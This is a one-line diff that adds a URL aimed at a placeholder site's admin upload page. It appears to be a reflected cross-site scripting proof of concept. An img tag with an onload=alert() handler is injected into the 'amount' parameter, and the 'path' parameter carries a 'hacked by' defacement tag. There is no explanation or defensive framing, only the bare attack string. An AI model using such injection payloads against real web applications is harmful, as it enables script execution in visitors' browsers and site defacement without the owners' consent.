@@ -1,0 +1,1 @@
+http://www.example.com/upload/admin/upload.php?amount=&lt;img+src=http://127.0.0.1/dot.gif+onload=alert(213771818860)&gt;&amp;path=hacked%20by%20indoushka 
